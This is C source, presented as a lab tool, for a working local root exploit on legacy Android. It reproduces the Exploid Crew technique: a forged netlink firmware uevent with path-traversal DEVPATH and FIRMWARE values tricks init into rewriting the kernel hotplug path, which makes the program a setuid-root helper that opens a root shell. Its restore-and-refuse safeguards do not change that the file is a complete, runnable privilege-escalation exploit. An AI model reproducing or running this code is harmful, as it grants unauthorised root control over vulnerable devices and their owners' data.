/* U20a lab: temporary root via the validated legacy init/firmware flaw.
 * Protocol reference: Android Exploid Crew exploid.c; AOSP Donut init/devices.c.
 * Stock hotplug MUST be /sbin/hotplug. No /system writes or remounts.
 * Privileged helper stays in tmpfs, accessible only through ADB shell UID/GID.
 */
#define DIR "/sqlite_stmt_journals/mero-temp-root-20261026"
#define SELF DIR "/root-helper"
#define STOCK "/sbin/hotplug"
static long sc(long n,long a,long b,long c){
 register long r0 __asm__("r0")=a,r1 __asm__("r1")=b,r2 __asm__("r2")=c,r7 __asm__("r7")=n;
 __asm__ volatile("svc 0":"+r"(r0):"r"(r1),"r"(r2),"r"(r7):"memory","cc");return r0;
}
static unsigned len(const char*s){unsigned n=0;while(s[n])++n;return n;}
static int eq(const char*a,const char*b){while(*a&&*a==*b){++a;++b;}return *a==*b;}
static void say(const char*s){sc(4,1,(long)s,len(s));}
__attribute__((noreturn)) static void finish(long n){sc(1,n,0,0);__builtin_unreachable();}
static int hook_is(const char*value){char b[256];long f=sc(5,(long)"/proc/sys/kernel/hotplug",0,0);if(f<0)return 0;long n=sc(3,f,(long)b,sizeof(b)-1);sc(6,f,0,0);if(n<0)return 0;while(n>0&&(b[n-1]=='\n'||b[n-1]==0))--n;b[n]=0;return eq(b,value);}
static void make_file(const char*p,const char*s,int mode){long f=sc(5,(long)p,193,mode);if(f<0){say("Refusing to overwrite an existing lab file.\n");finish(10);}if(sc(4,f,(long)s,len(s))!=(long)len(s))finish(11);sc(6,f,0,0);}
static int restore_hook(void){long f=sc(5,(long)"/proc/sys/kernel/hotplug",513,0);if(f<0)return 0;long n=sc(4,f,(long)(STOCK "\n"),sizeof(STOCK));sc(6,f,0,0);return n==(long)sizeof(STOCK)&&hook_is(STOCK);}
struct addr{unsigned short family,pad;unsigned pid,groups;};
struct iov{const void*base;unsigned len;};
struct msg{struct addr*name;unsigned namelen;struct iov*iov;unsigned iovlen;void*control;unsigned controllen,flags;};
static void send_event(int restore){
 static const char arm[]="ACTION=add\0DEVPATH=/.." DIR "\0SUBSYSTEM=firmware\0FIRMWARE=../../.." DIR "/arm-payload\0";
 static const char undo[]="ACTION=add\0DEVPATH=/.." DIR "\0SUBSYSTEM=firmware\0FIRMWARE=../../.." DIR "/restore-payload\0";
 struct addr a={16,0,1,0};struct iov io={restore?undo:arm,restore?sizeof(undo):sizeof(arm)};struct msg m={&a,sizeof(a),&io,1,0,0,0};
 long f=sc(281,16,2,15);if(f<0)finish(12);long n=sc(296,f,(long)&m,0);sc(6,f,0,0);if(n<0)finish(13);
}
__attribute__((noreturn)) void entry(unsigned long*stack){
 unsigned argc=stack[0];char**argv=(char**)&stack[1];char**env=argv+argc+1;long uid=sc(24,0,0,0),euid=sc(49,0,0,0);
 if(euid==0&&uid==0){
  /* Kernel invocation: restore normal behavior BEFORE granting any root helper. */
  if(!restore_hook())finish(20);
  if(sc(182,(long)SELF,0,2000)<0)finish(21);
  if(sc(15,(long)SELF,04750,0)<0)finish(22);
  char*stock_args[]={STOCK,argc>1?argv[1]:0,0};
  sc(11,(long)STOCK,(long)stock_args,(long)env);finish(0);
 }
 if(euid==0&&uid==2000){
  if(!hook_is(STOCK)){say("Stock hotplug has not been restored; refusing a root shell.\n");finish(23);}
  if(sc(46,0,0,0)<0||sc(23,0,0,0)<0)finish(24);
  char*shell_args[]={"/system/bin/sh",0,0,0};
  if(argc==3&&eq(argv[1],"-c")){shell_args[1]="-c";shell_args[2]=argv[2];}
  else if(argc!=1){say("Usage: root-helper [-c command]\n");finish(25);}
  sc(11,(long)shell_args[0],(long)shell_args,(long)env);finish(26);
 }
 if(uid!=2000||euid!=2000){say("Run only as the ADB shell.\n");finish(1);}
 if(argc==2&&eq(argv[1],"--disarm")){
  if(hook_is(STOCK)){say("Stock hotplug is already restored.\n");finish(0);}
  if(!hook_is(SELF)){say("Unexpected hotplug value; no write attempted.\n");finish(2);}
  send_event(1);say("Requested restoration of stock hotplug.\n");finish(0);
 }
 if(argc!=2||!eq(argv[1],"--arm")){say("Not elevated yet. Usage: root-helper --arm or --disarm\n");finish(3);}
 if(!hook_is(STOCK)){say("Unexpected baseline; no privileged write attempted.\n");finish(4);}
 make_file(DIR "/loading","0",0600);
 make_file(DIR "/arm-payload",SELF "\n",0400);
 make_file(DIR "/restore-payload",STOCK "\n",0400);
 if(sc(83,(long)"/proc/sys/kernel/hotplug",(long)(DIR "/data"),0)<0)finish(5);
 send_event(0);say("Temporary helper armed. A hardware hotplug event will activate it and restore the stock helper.\n");finish(0);
}
__attribute__((naked,noreturn)) void _start(void){__asm__ volatile("mov r0, sp\nb entry");}
